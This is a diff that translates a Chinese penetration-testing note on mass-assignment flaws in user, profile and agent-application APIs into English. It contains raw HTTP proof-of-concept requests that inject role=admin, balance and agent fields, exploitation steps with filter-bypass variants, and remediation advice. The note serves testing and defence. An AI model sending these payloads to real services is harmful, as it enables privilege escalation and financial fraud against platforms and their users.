@@ -1,61 +1,61 @@
 ﻿---
-title: Mass Assignment（注册/资料接口注入 role / vip / balance / agentId）
-cve: 无（业务逻辑）
+title: Mass Assignment (inject role / vip / balance / agentId through registration/profile endpoints)
+cve: None (business logic)
 severity: high
 cvss: 8.8
-product: 自研用户/代理接口
-versions: 任意
+product: Custom user/agent endpoints
+versions: Any
 ports: 80, 443
-keywords: mass assignment, 批量赋值, role, vip, balance, agentId
-entry: 注册体里多带一个 role=admin
+keywords: mass assignment, mass assignment, role, vip, balance, agentId
+entry: Add role=admin to the registration body
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
-- 注册/资料更新接口的回包字段与请求字段高度重合：`role`、`vipLevel`、`balance`、`agentId`、`status`、`isAdmin`。
-- 前端表单只提交部分字段（说明后端可能整体绑定对象）。
+- Registration/profile-update responses closely overlap request fields: `role`, `vipLevel`, `balance`, `agentId`, `status`, `isAdmin`.
+- Frontend forms submit only some fields (suggesting the backend may bind the entire object).
 
-## 前置条件
+## Prerequisites
 
-- 能注册账号；抓包。
+- Ability to register an account and capture traffic.
 
 ## PoC
 
 ```http
-### 1) 注册时多塞字段
+### 1) Add extra fields during registration
 POST /api/user/register HTTP/1.1
 Content-Type: application/json
 
 {"phone":"13900000003","password":"Passw0rd!","code":"1234","role":"admin","vipLevel":9,"balance":100000,"agentId":1}
 
-### 2) 资料更新时改权限
+### 2) Change privileges through profile updates
 POST /api/user/update HTTP/1.1
 Authorization: Bearer <token>
 
 {"nickname":"x","role":"admin","isAgent":true,"commissionRate":"0.9"}
 
-### 3) 代理申请接口的审核态
+### 3) Approval state on the agent-application endpoint
 POST /api/agent/apply HTTP/1.1
 
-{"uid":<自己>,"status":1,"agentLevel":"总代"}
+{"uid":<yourself>,"status":1,"agentLevel":"master agent"}
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 注册/更新各打一次"多字段"请求，回读 `/api/user/info` 看字段是否被采纳。
-2. 优先级：`role`/`isAdmin` > `agentId`/`isAgent` > `balance`/`vipLevel`（前两个是权限，后两个是钱）。
-3. 被过滤时换大小写/驼峰/嵌套：`Role`、`is_admin`、`{"user":{"role":"admin"}}`、`role[]=admin`。
-4. 命中后看能否进后台（`/api/admin/**`）或改佣金比例（配合 `agent-hierarchy-privilege.md`）。
-5. 证据：一条请求 + `/api/user/info` 回读；不要真的提现。
+1. Send one "extra fields" request each for registration/update, then read `/api/user/info` to see whether the fields were accepted.
+2. Priority: `role`/`isAdmin` > `agentId`/`isAgent` > `balance`/`vipLevel` (the first two concern permissions, the last two money).
+3. If filtered, try case/camelCase/nesting variants: `Role`, `is_admin`, `{"user":{"role":"admin"}}`, `role[]=admin`.
+4. After success, check for backend access (`/api/admin/**`) or commission-rate changes (combine with `agent-hierarchy-privilege.md`).
+5. Evidence: one request + a read-back from `/api/user/info`; do not actually withdraw.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 白名单绑定（DTO 只列允许字段）；`role`/`balance`/`agentId` 一律服务端赋值。
-- 更新接口做字段级鉴权（非管理员不能改 role）。
-- 注册/资料变更写审计。
+- Allowlist binding (DTOs list only permitted fields); always assign `role`/`balance`/`agentId` server-side.
+- Enforce field-level authorization on updates (non-admins cannot change role).
+- Audit registration/profile changes.
 
-## 参考
+## References
 
 - OWASP Mass Assignment Cheat Sheet；CWE-915。
